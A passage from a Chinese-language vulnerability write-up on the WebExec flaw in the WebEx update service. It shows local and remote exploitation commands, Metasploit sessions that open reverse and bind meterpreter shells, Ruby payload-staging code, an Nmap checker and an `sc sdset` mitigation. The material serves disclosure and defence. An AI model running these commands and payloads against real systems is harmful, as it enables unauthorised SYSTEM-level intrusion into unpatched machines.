而且是GUI界面以`SYSTEM`权限运行的。
但是以同样的方式运行cmd.exe和powershell却不能工作。
## 本地利用
最简单的利用方式就是用`wmic.exe`打开`cmd.exe`：
    C:Usersron>sc start webexservice a software-update 1 wmic process call create "cmd.exe"
命令会打开一个`SYSTEM`权限的GUI cmd.exe实例：
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    C:Windowssystem32>whoami
    nt authoritysystem
如果不以GUI方式打开，也可以提权：
    C:Usersron>net localgroup administrators
    [...]
    Administrator
    ron
    C:Usersron>sc start webexservice a software-update 1 net localgroup administrators testuser /add
    [...]
    C:Usersron>net localgroup administrators
    [...]
    Administrator
    ron
    testuser
Jeff写了一个 Metasploit
本地模块来进行权限提升。如果攻击者在受影响的机器上有非SYSTEM的session，就可以用这种方式来获取SYSTEM账号（权限）：
    meterpreter > getuid
    Server username: IEWIN7IEUser
    meterpreter > background
    [*] Backgrounding session 2...
    msf exploit(multi/handler) > use exploit/windows/local/webexec
    msf exploit(windows/local/webexec) > set SESSION 2
    SESSION => 2
    msf exploit(windows/local/webexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(windows/local/webexec) > set LHOST 172.16.222.1
    msf exploit(windows/local/webexec) > set LPORT 9001
    msf exploit(windows/local/webexec) > run
    [*] Started reverse TCP handler on 172.16.222.1:9001
    [*] Checking service exists...
    [*] Writing 73802 bytes to %SystemRoot%TempyqaKLvdn.exe...
    [*] Launching service...
    [*] Sending stage (179779 bytes) to 172.16.222.132
    [*] Meterpreter session 2 opened (172.16.222.1:9001 -> 172.16.222.132:49574) at 2018-08-31 14:45:25 -0700
    [*] Service started...
    meterpreter > getuid
    Server username: NT AUTHORITYSYSTEM
## 远程利用
最简单的漏洞利用可以通过Windows sc命令完成。可以在远程机器上创建一个session或用相同的凭证创建一个本地用户，然后在该用户环境下（`runas
/user:newuser cmd.exe`）运行cmd.exe。完成后，就可以在远程主机上使用相同的命令了：
    c:>sc \10.0.0.0 start webexservice a software-update 1 net localgroup administrators testuser /add
###  利用Metasploit远程利用
为了简化攻击，研究人员写了另外一对Metasploit模块。一个是实现该攻击来远程运行任意命令的辅助模块，另一个是完整的利用模块。两个模块都需要有效的SMB账号（本地或域账户都可以），但主要都依赖于WebExec
library 。
下面是用复制模块来运行计算器的例子：
    msf5 > use auxiliary/admin/smb/webexec_command
    msf5 auxiliary(admin/smb/webexec_command) > set RHOSTS 192.168.1.100-110
    RHOSTS => 192.168.56.100-110
    msf5 auxiliary(admin/smb/webexec_command) > set SMBUser testuser
    SMBUser => testuser
    msf5 auxiliary(admin/smb/webexec_command) > set SMBPass testuser
    SMBPass => testuser
    msf5 auxiliary(admin/smb/webexec_command) > set COMMAND calc
    COMMAND => calc
    msf5 auxiliary(admin/smb/webexec_command) > exploit
    [-] 192.168.56.105:445    - No service handle retrieved
    [+] 192.168.56.105:445    - Command completed!
    [-] 192.168.56.103:445    - No service handle retrieved
    [+] 192.168.56.103:445    - Command completed!
    [+] 192.168.56.104:445    - Command completed!
    [+] 192.168.56.101:445    - Command completed!
    [*] 192.168.56.100-110:445 - Scanned 11 of 11 hosts (100% complete)
    [*] Auxiliary module execution completed
下面是完整的利用模块：
    msf5 > use exploit/windows/smb/webexec
    msf5 exploit(windows/smb/webexec) > set SMBUser testuser
    SMBUser => testuser
    msf5 exploit(windows/smb/webexec) > set SMBPass testuser
    SMBPass => testuser
    msf5 exploit(windows/smb/webexec) > set PAYLOAD windows/meterpreter/bind_tcp
    PAYLOAD => windows/meterpreter/bind_tcp
    msf5 exploit(windows/smb/webexec) > set RHOSTS 192.168.56.101
    RHOSTS => 192.168.56.101
    msf5 exploit(windows/smb/webexec) > exploit
    [*] 192.168.56.101:445 - Connecting to the server...
    [*] 192.168.56.101:445 - Authenticating to 192.168.56.101:445 as user 'testuser'...
    [*] 192.168.56.101:445 - Command Stager progress -   0.96% done (999/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress -   1.91% done (1998/104435 bytes)
    ...
    [*] 192.168.56.101:445 - Command Stager progress -  98.52% done (102891/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress -  99.47% done (103880/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress - 100.00% done (104435/104435 bytes)
    [*] Started bind TCP handler against 192.168.56.101:4444
    [*] Sending stage (179779 bytes) to 192.168.56.101
从上面的代码可以看出，真实的实现非常直接，但这里要说的是利用模块的一个问题：如何上传一个meterpreter .exe并且运行呢？
研究人员用类psexec的利用将.exe文件上传到可写分区，然后通过WebExec执行。但是上传到share分区一般需要管理员权限，这里可以使用psexec。但这就失去了WebExec的作用。
在与 Egyp7讨论过后，研究人员认为可以用`Msf::Exploit::CmdStager
mixin`。用`.vbs`写一个Base64编码的文件到硬盘，然后解码并执行。
但这种方案也有一些问题：
  * 每行最大长度为1200个字符，而`CmdStager mixin`每行会用2000个字符；
  * `CmdStager`会用`%TEMP%`作为临时目录，但当前利用并不扩展路径；
  * `WebExecService`好像会用反斜杠转义引号，研究人员不清楚如何关闭。
前两个问题很好解决：
    wexec(true) do |opts|
      opts[:flavor] = :vbs
      opts[:linemax] = datastore["MAX_LINE_LENGTH"]
      opts[:temp] = datastore["TMPDIR"]
      opts[:delay] = 0.05
      execute_cmdstager(opts)
    end
execute_cmdstager() 可以执行execute_command() 来构建payload，这里就修复了最后一个问题：
    # This is the callback for cmdstager, which breaks the full command into
    # chunks and sends it our way. We have to do a bit of finangling to make it
    # work correctly
    def execute_command(command, opts)
      # Replace the empty string, "", with a workaround - the first 0 characters of "A"
      command = command.gsub('""', 'mid(Chr(65), 1, 0)')
      # Replace quoted strings with Chr(XX) versions, in a naive way
      command = command.gsub(/"[^"]*"/) do |capture|
        capture.gsub(/"/, "").chars.map do |c|
          "Chr(#{c.ord})"
        end.join('+')
      end
      # Prepend "cmd /c" so we can use a redirect
      command = "cmd /c " + command
      execute_single_command(command, opts)
    end
首先，用空字符串替换`mid(Chr(65), 1, 0)`。  
第二，用`Chr(n)+Chr(n)+....`替换其他字符串。但是不能使用`&`，因为这是shell用来连接命令的。  
最后，将`cmd/c`加到命令之前，这可以将结果输出到文件，也可以用`^>`代替。
## 检查补丁
修复的WebEx也可以使远程用户连接到进程，并启动。但如何进程被检测到正运行一个没有被WebEx签名的可执行文件，执行就会中止。而且研究人员也不清楚主机是否有漏洞。
为了验证代码是否运行，研究人员使用DNS请求、telnet返回特定端口，在webroot中释放文件等方式进行验证。问题是如果没有通用的检查方法，还不如使用脚本呢。
为了利用这一点，研究人员必须要获取到`service-controlservice
(svcctl)`的句柄。因此，研究人员决定安装一个假的服务，尝试启动，然后删除。如果启动服务返回的是`ok`或`ACCESS_DENIED`，就知道代码是否运行了。
下面是研究人员开发的Nmap checker模块的重要代码：
    -- Create a test service that we can query
    local webexec_command = "sc create " .. test_service .. " binpath= c:\fakepath.exe"
    status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
    -- ...
    local test_status, test_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], test_service, 0x00000)
    -- If the service DOES_NOT_EXIST, we couldn't run code
    if string.match(test_result, 'DOES_NOT_EXIST') then
      stdnse.debug("Result: Test service does not exist: probably not vulnerable")
      msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
      vuln.check_results = "Could not execute code via WebExService"
      return report:make_output(vuln)
    end
    Not shown: we also delete the service once we're finished.
## 总结
WebEx
10月3日发布了补丁，详见webexec.org。好消息是该服务的修复版本只能运行WebEx签名的文件。坏消息是有许多版本都没有修复，而且该服务可以远程启动。
如果不想远程启动该服务，可以用命令关闭：
    c:>sc sdset webexservice D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
这就移除了该服务的远程和非交互式访问。